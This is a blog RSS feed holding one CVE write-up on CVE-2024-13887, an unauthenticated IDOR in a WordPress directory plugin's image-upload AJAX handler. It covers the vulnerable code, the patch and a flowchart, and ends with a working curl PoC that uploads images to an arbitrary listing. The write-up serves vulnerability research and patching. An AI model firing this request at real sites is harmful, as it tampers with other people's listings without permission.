<?xml version="1.0" encoding="utf-8" standalone="yes"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
  <channel>
    <title>All Posts - Bui Van Y</title>
    <link>http://localhost:1313/posts/</link>
    <description>Bui Van Y</description>
    <generator>Hugo 0.153.2 &amp; FixIt v0.4.0-alpha.3-20251225101113-8ffb9a95</generator>
    <language>en</language>
    <managingEditor>w41bu1@gmail.com (Bui Van Y)</managingEditor>
    <webMaster>w41bu1@gmail.com (Bui Van Y)</webMaster>
    <lastBuildDate>Wed, 31 Dec 2025 19:00:00 +0700</lastBuildDate>
    <atom:link href="http://localhost:1313/posts/index.xml" rel="self" type="application/rss+xml" />
    <item>
      <title>CVE-2024-13887 Analysis &amp; POC</title>
      <link>http://localhost:1313/posts/2025-12-31-cve-2024-13887/</link>
      <pubDate>Wed, 31 Dec 2025 19:00:00 +0700</pubDate><author>w41bu1@gmail.com (Bui Van Y)</author>
      <guid>http://localhost:1313/posts/2025-12-31-cve-2024-13887/</guid>
      <category domain="http://localhost:1313/categories/cve-analysis/">CVE Analysis</category>
      <description>&lt;img src=&#34;http://localhost:1313/posts/2025-12-31-cve-2024-13887/app.png&#34; alt=&#34;featured image&#34; referrerpolicy=&#34;no-referrer&#34;&gt;&lt;h2 class=&#34;heading-element&#34; id=&#34;cve--basic-info&#34;&gt;&lt;span&gt;CVE &amp;amp; Basic Info&lt;/span&gt;&#xA;  &lt;a href=&#34;#cve--basic-info&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;The &lt;strong&gt;Business Directory Plugin – Easy Listing Directories for WordPress&lt;/strong&gt; plugin contains an &lt;strong&gt;Insecure Direct Object Reference (IDOR)&lt;/strong&gt; vulnerability in all versions up to &lt;strong&gt;6.4.14&lt;/strong&gt;, through the &lt;code&gt;ajax_listing_submit_image_upload&lt;/code&gt; function due to missing validation on a user-controlled key. This allows &lt;strong&gt;unauthenticated attackers&lt;/strong&gt; to &lt;strong&gt;upload arbitrary images to listings&lt;/strong&gt;.&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVE ID&lt;/strong&gt;: &lt;a href=&#34;https://www.cve.org/CVERecord?id=CVE-2024-13887&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;CVE-2024-13887&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Vulnerability Type&lt;/strong&gt;: Insecure Direct Object References (IDOR)&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Affected Versions&lt;/strong&gt;: &amp;lt;= 6.4.14&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Patched Versions&lt;/strong&gt;: 6.4.15&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVSS severity&lt;/strong&gt;: Low (5.3)&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Required Privilege&lt;/strong&gt;: Unauthenticated&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Product&lt;/strong&gt;: &lt;a href=&#34;https://wordpress.org/plugins/business-directory-plugin/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;WordPress Business Directory Plugin&lt;/a&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;requirements&#34;&gt;&lt;span&gt;Requirements&lt;/span&gt;&#xA;  &lt;a href=&#34;#requirements&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ul&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;&lt;strong&gt;Local WordPress &amp;amp; Debugging&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;a href=&#34;https://w41bu1.github.io/posts/2025-08-21-wordpress-local-and-debugging/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Virtual Machine&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;a href=&#34;https://w41bu1.github.io/posts/2025-10-22-wordpress-local-and-debugging-docker/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Docker&lt;/a&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;&lt;strong&gt;Plugin Version&lt;/strong&gt; – &lt;strong&gt;Business Directory&lt;/strong&gt;:&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;code&gt;6.4.14&lt;/code&gt; – &lt;strong&gt;vulnerable&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;code&gt;6.4.15&lt;/code&gt; – &lt;strong&gt;patched&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;&lt;strong&gt;Diff Tool (diff)&lt;/strong&gt; → &lt;a href=&#34;https://meldmerge.org/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;&lt;strong&gt;Meld&lt;/strong&gt;&lt;/a&gt; or any diff tool.&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;analysis&#34;&gt;&lt;span&gt;Analysis&lt;/span&gt;&#xA;  &lt;a href=&#34;#analysis&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;The plugin registers an AJAX handler &lt;strong&gt;for logged-out users&lt;/strong&gt;:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;add_action( &amp;#39;wp_ajax_nopriv_wpbdp-listing-submit-image-upload&amp;#39;, array( &amp;amp;$this, &amp;#39;ajax_listing_submit_image_upload&amp;#39; ) );&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;code&gt;wp_ajax_nopriv&lt;/code&gt; is a hook available to all users, including unauthenticated users. When a request is sent to the &lt;code&gt;/wp-admin/admin-ajax.php&lt;/code&gt; endpoint with the parameter &lt;code&gt;action=wpbdp-listing-submit-image-upload&lt;/code&gt;, the callback &lt;code&gt;ajax_listing_submit_image_upload&lt;/code&gt; is executed:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;public function ajax_listing_submit_image_upload() {&#xA;    $res = new WPBDP_AJAX_Response();&#xA;&#xA;    $listing_id = intval( $_REQUEST[&amp;#39;listing_id&amp;#39;] );&#xA;    ...&#xA;    $files  = wpbdp_flatten_files_array( isset( $_FILES[&amp;#39;images&amp;#39;] ) ? $_FILES[&amp;#39;images&amp;#39;] : array() );&#xA;    $errors = array();&#xA;&#xA;    $listing         = WPBDP_Listing::get( $listing_id );&#xA;    $slots_available = 0;&#xA;    $plan            = $listing-&amp;gt;get_fee_plan();&#xA;    if ( ! $plan ) {&#xA;        return $res-&amp;gt;send_error( __( &amp;#39;Please select a plan before uploading images to the listing&amp;#39;, &amp;#39;business-directory-plugin&amp;#39; ) );&#xA;    }&#xA;&#xA;    $slots_available = absint( $plan-&amp;gt;fee_images ) - absint( $_POST[&amp;#39;images_count&amp;#39;] );&#xA;    if ( 0 &amp;gt;= $slots_available ) {&#xA;        return $res-&amp;gt;send_error( __( &amp;#39;Can not upload any more images for this listing.&amp;#39;, &amp;#39;business-directory-plugin&amp;#39; ) );&#xA;    } elseif ( $slots_available &amp;lt; count( $files ) ) {&#xA;        return $res-&amp;gt;send_error(&#xA;            sprintf(&#xA;                _nx(&#xA;                    &amp;#39;You\&amp;#39;re trying to upload %1$d images, but only have %2$d slot available. Please adjust your selection.&amp;#39;,&#xA;                    &amp;#39;You\&amp;#39;re trying to upload %1$d images, but only have %2$d slots available. Please adjust your selection.&amp;#39;,&#xA;                    $slots_available,&#xA;                    &amp;#39;listing image upload&amp;#39;,&#xA;                    &amp;#39;business-directory-plugin&amp;#39;&#xA;                ),&#xA;                count( $files ),&#xA;                $slots_available&#xA;            )&#xA;        );&#xA;    }&#xA;&#xA;    foreach ( $files as $i =&amp;gt; $file ) {&#xA;        $image_error   = &amp;#39;&amp;#39;;&#xA;        $attachment_id = wpbdp_media_upload(&#xA;            $file,&#xA;            true,&#xA;            true,&#xA;            array(&#xA;                &amp;#39;image&amp;#39;      =&amp;gt; true,&#xA;                &amp;#39;min-size&amp;#39;   =&amp;gt; intval( wpbdp_get_option( &amp;#39;image-min-filesize&amp;#39; ) ) * 1024,&#xA;                &amp;#39;max-size&amp;#39;   =&amp;gt; intval( wpbdp_get_option( &amp;#39;image-max-filesize&amp;#39; ) ) * 1024,&#xA;                &amp;#39;min-width&amp;#39;  =&amp;gt; wpbdp_get_option( &amp;#39;image-min-width&amp;#39; ),&#xA;                &amp;#39;min-height&amp;#39; =&amp;gt; wpbdp_get_option( &amp;#39;image-min-height&amp;#39; ),&#xA;            ),&#xA;            $image_error&#xA;        ); // TODO: handle errors.&#xA;&#xA;        if ( $image_error ) {&#xA;            $errors[ $file[&amp;#39;name&amp;#39;] ] = $image_error;&#xA;        } else {&#xA;            $attachments[] = $attachment_id;&#xA;        }&#xA;    }&#xA;&#xA;    $html = &amp;#39;&amp;#39;;&#xA;    foreach ( $attachments as $attachment_id ) {&#xA;        $html .= wpbdp_render(&#xA;            &amp;#39;submit-listing-images-single&amp;#39;,&#xA;            array(&#xA;                &amp;#39;image_id&amp;#39;   =&amp;gt; $attachment_id,&#xA;                &amp;#39;listing_id&amp;#39; =&amp;gt; $listing_id,&#xA;            ),&#xA;            false&#xA;        );&#xA;    }&#xA;&#xA;    $has_images = $listing-&amp;gt;get_images( &amp;#39;ids&amp;#39; );&#xA;    $listing-&amp;gt;set_images( $attachments, true );&#xA;&#xA;    // Maybe set thumbnail if there aren&amp;#39;t already images on this listing.&#xA;    if ( ! $has_images ) {&#xA;        $image_id = reset( $attachments );&#xA;        $listing-&amp;gt;set_thumbnail_id( $image_id );&#xA;    }&#xA;&#xA;    if ( $errors ) {&#xA;        $error_msg = &amp;#39;&amp;#39;;&#xA;&#xA;        foreach ( $errors as $fname =&amp;gt; $error ) {&#xA;            $error_msg .= sprintf( &amp;#39;&amp;amp;#149; %s: %s&amp;#39;, $fname, $error ) . &amp;#39;&amp;lt;br /&amp;gt;&amp;#39;;&#xA;        }&#xA;&#xA;        $res-&amp;gt;add( &amp;#39;uploadErrors&amp;#39;, $error_msg );&#xA;    }&#xA;&#xA;    $res-&amp;gt;add( &amp;#39;is_admin&amp;#39;, wpbdp_user_is_admin() );&#xA;    $res-&amp;gt;add( &amp;#39;slots_available&amp;#39;, $slots_available );&#xA;    $res-&amp;gt;add( &amp;#39;attachmentIds&amp;#39;, $attachments );&#xA;    $res-&amp;gt;add( &amp;#39;html&amp;#39;, $html );&#xA;    $res-&amp;gt;send();&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;The function retrieves &lt;code&gt;listing_id&lt;/code&gt; and &lt;code&gt;images&lt;/code&gt; from the request:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;$listing_id = intval( $_REQUEST[&amp;#39;listing_id&amp;#39;] );&#xA;$files  = wpbdp_flatten_files_array( isset( $_FILES[&amp;#39;images&amp;#39;] ) ? $_FILES[&amp;#39;images&amp;#39;] : array() );&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;The function stops if a plan has not been selected:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;$plan = $listing-&amp;gt;get_fee_plan();&#xA;if ( ! $plan ) {&#xA;    return $res-&amp;gt;send_error( __( &amp;#39;Please select a plan before uploading images to the listing&amp;#39;, &amp;#39;business-directory-plugin&amp;#39; ) );&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-12-31-cve-2024-13887/plan.png&#34; title=&#34;Select plan&#34; data-thumbnail=&#34;/posts/2025-12-31-cve-2024-13887/plan.png&#34; data-sub-html=&#34;&lt;h2&gt;Plan&lt;/h2&gt;&lt;p&gt;Select plan&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-12-31-cve-2024-13887/plan.png&#39; alt=&#34;Plan&#34; height=&#34;459&#34; width=&#34;705&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Select plan&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;p&gt;Then it checks the remaining available upload slots:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;$slots_available = absint( $plan-&amp;gt;fee_images ) - absint( $_POST[&amp;#39;images_count&amp;#39;] );&#xA;if ( 0 &amp;gt;= $slots_available ) {&#xA;    return $res-&amp;gt;send_error( __( &amp;#39;Can not upload any more images for this listing.&amp;#39;, &amp;#39;business-directory-plugin&amp;#39; ) );&#xA;} elseif ( $slots_available &amp;lt; count( $files ) ) {&#xA;    return $res-&amp;gt;send_error(&#xA;        sprintf(&#xA;            _nx(&#xA;                &amp;#39;You\&amp;#39;re trying to upload %1$d images, but only have %2$d slot available. Please adjust your selection.&amp;#39;,&#xA;                &amp;#39;You\&amp;#39;re trying to upload %1$d images, but only have %2$d slots available. Please adjust your selection.&amp;#39;,&#xA;                $slots_available,&#xA;                &amp;#39;listing image upload&amp;#39;,&#xA;                &amp;#39;business-directory-plugin&amp;#39;&#xA;            ),&#xA;            count( $files ),&#xA;            $slots_available&#xA;        )&#xA;    );&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-12-31-cve-2024-13887/slot.png&#34; title=&#34;Slot&#34; data-thumbnail=&#34;/posts/2025-12-31-cve-2024-13887/slot.png&#34; data-sub-html=&#34;&lt;h2&gt;Slot&lt;/h2&gt;&lt;p&gt;Slot&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-12-31-cve-2024-13887/slot.png&#39; alt=&#34;Slot&#34; height=&#34;439&#34; width=&#34;509&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Slot&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;p&gt;If &lt;code&gt;slot &amp;lt;= 0&lt;/code&gt;, an error is returned. Otherwise, the code iterates through the uploaded files and calls &lt;code&gt;wpbdp_media_upload&lt;/code&gt; to upload them.&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;foreach ( $files as $i =&amp;gt; $file ) {&#xA;    $image_error   = &amp;#39;&amp;#39;;&#xA;    $attachment_id = wpbdp_media_upload(&#xA;        $file,&#xA;        true,&#xA;        true,&#xA;        array(&#xA;            &amp;#39;image&amp;#39;      =&amp;gt; true,&#xA;            &amp;#39;min-size&amp;#39;   =&amp;gt; intval( wpbdp_get_option( &amp;#39;image-min-filesize&amp;#39; ) ) * 1024,&#xA;            &amp;#39;max-size&amp;#39;   =&amp;gt; intval( wpbdp_get_option( &amp;#39;image-max-filesize&amp;#39; ) ) * 1024,&#xA;            &amp;#39;min-width&amp;#39;  =&amp;gt; wpbdp_get_option( &amp;#39;image-min-width&amp;#39; ),&#xA;            &amp;#39;min-height&amp;#39; =&amp;gt; wpbdp_get_option( &amp;#39;image-min-height&amp;#39; ),&#xA;        ),&#xA;        $image_error&#xA;    ); // TODO: handle errors.&#xA;&#xA;    if ( $image_error ) {&#xA;        $errors[ $file[&amp;#39;name&amp;#39;] ] = $image_error;&#xA;    } else {&#xA;        $attachments[] = $attachment_id;&#xA;    }&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Finally, the function returns upload information in JSON format.&lt;/p&gt;&#xA;&lt;div class=&#34;details admonition bug open disabled&#34;&gt;&#xA;  &lt;div class=&#34;details-summary admonition-title&#34;&gt;&lt;i class=&#34;icon fa-fw fa-solid fa-bug&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;Bug&lt;/div&gt;&#xA;  &lt;div class=&#34;details-content&#34;&gt;&#xA;    &lt;div class=&#34;admonition-content&#34;&gt;&lt;p&gt;The vulnerability occurs because there is no binding between &lt;code&gt;listing_id&lt;/code&gt; and the authorized user performing the upload. An attacker can upload arbitrary images by modifying the &lt;code&gt;listing_id&lt;/code&gt; parameter.&lt;/p&gt;&lt;/div&gt;&#xA;  &lt;/div&gt;&#xA;&lt;/div&gt;&lt;p&gt;The &lt;code&gt;v6.4.15&lt;/code&gt; patch introduced several mitigations:&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-12-31-cve-2024-13887/patch.png&#34; title=&#34;Patch&#34; data-thumbnail=&#34;/posts/2025-12-31-cve-2024-13887/patch.png&#34; data-sub-html=&#34;&lt;h2&gt;Patch&lt;/h2&gt;&lt;p&gt;Patch&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-12-31-cve-2024-13887/patch.png&#39; alt=&#34;Patch&#34; height=&#34;678&#34; width=&#34;1915&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Patch&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;Adds nonce verification using &lt;code&gt;check_ajax_referer&lt;/code&gt; → CSRF protection&lt;/li&gt;&#xA;&lt;li&gt;Checks listing ownership; if the user does not own the listing, an error is returned.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;pre&gt;&lt;code&gt;if ( ! wpbdp_user_is_admin() &amp;amp;&amp;amp; ! $listing-&amp;gt;owned_by_user( get_current_user_id() ) ) {&#xA;    return $res-&amp;gt;send_error( __( &amp;#39;You do not have permission to upload images to this listing&amp;#39;, &amp;#39;business-directory-plugin&amp;#39; ) );&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;h2 class=&#34;heading-element&#34; id=&#34;flow&#34;&gt;&lt;span&gt;Flow&lt;/span&gt;&#xA;  &lt;a href=&#34;#flow&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;pre&gt;&lt;code&gt;flowchart TD&#xA;A[&amp;#34;Unauthenticated Attacker&amp;#34;]&#xA;--&amp;gt; B[&amp;#34;Send POST request to /wp-admin/admin-ajax.php&amp;#34;]&#xA;&#xA;B --&amp;gt; C[&amp;#34;action=wpbdp-listing-submit-image-upload&amp;#34;]&#xA;&#xA;C --&amp;gt; D[&amp;#34;WordPress triggers ajax_listing_submit_image_upload()&amp;#34;]&#xA;&#xA;D --&amp;gt; E[&amp;#34;No authentication required (wp_ajax_nopriv_)&amp;#34;]&#xA;&#xA;E --&amp;gt; F[&amp;#34;Extract listing_id from request&amp;#34;]&#xA;&#xA;F --&amp;gt; G[&amp;#34;Load listing object by ID&amp;#34;]&#xA;&#xA;G --&amp;gt; H{&amp;#34;Listing has fee plan?&amp;#34;}&#xA;&#xA;H -- No --&amp;gt; I[&amp;#34;Return error: select a plan&amp;#34;]&#xA;H -- Yes --&amp;gt; J[&amp;#34;Calculate remaining image slots&amp;#34;]&#xA;&#xA;J --&amp;gt; K{&amp;#34;slots_available &amp;gt; 0?&amp;#34;}&#xA;&#xA;K -- No --&amp;gt; L[&amp;#34;Return error: no available slots&amp;#34;]&#xA;K -- Yes --&amp;gt; M[&amp;#34;Process uploaded files&amp;#34;]&#xA;&#xA;M --&amp;gt; N[&amp;#34;Call wpbdp_media_upload()&amp;#34;]&#xA;&#xA;N --&amp;gt; O[&amp;#34;Attach uploaded image to listing&amp;#34;]&#xA;&#xA;O --&amp;gt; P[&amp;#34;Set thumbnail if needed&amp;#34;]&#xA;&#xA;P --&amp;gt; Q[&amp;#34;Return success response (JSON)&amp;#34;]&#xA;&#xA;Q --&amp;gt; R[&amp;#34;Image successfully attached to arbitrary listing&amp;#34;]&#xA;&#xA;R --&amp;gt; S[&amp;#34;IDOR: No ownership / permission validation&amp;#34;]&lt;/code&gt;&lt;/pre&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;proof-of-concept-poc&#34;&gt;&lt;span&gt;Proof of Concept (PoC)&lt;/span&gt;&#xA;  &lt;a href=&#34;#proof-of-concept-poc&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;Send request:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;curl -X POST http://localhost/wp-admin/admin-ajax.php \&#xA;  -F &amp;#34;action=wpbdp-listing-submit-image-upload&amp;#34; \&#xA;  -F &amp;#34;listing_id=88&amp;#34; \&#xA;  -F &amp;#34;images=@/path/to/image.jpg&amp;#34;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;strong&gt;Result&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-12-31-cve-2024-13887/result.png&#34; title=&#34;Result&#34; data-thumbnail=&#34;/posts/2025-12-31-cve-2024-13887/result.png&#34; data-sub-html=&#34;&lt;h2&gt;Result&lt;/h2&gt;&lt;p&gt;Result&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-12-31-cve-2024-13887/result.png&#39; alt=&#34;Result&#34; height=&#34;271&#34; width=&#34;749&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Result&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;conclusion&#34;&gt;&lt;span&gt;Conclusion&lt;/span&gt;&#xA;  &lt;a href=&#34;#conclusion&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;The CVE-2024-13887 vulnerability arises because the &lt;code&gt;wpbdp-listing-submit-image-upload&lt;/code&gt; endpoint allows unauthenticated access and does not verify ownership of &lt;code&gt;listing_id&lt;/code&gt;. This allows attackers to upload images to any valid listing simply by modifying the input parameter. Version 6.4.15 fixes this by adding nonce verification and ownership checks.&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;key-takeaways&#34;&gt;&lt;span&gt;Key Takeaways&lt;/span&gt;&#xA;  &lt;a href=&#34;#key-takeaways&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; 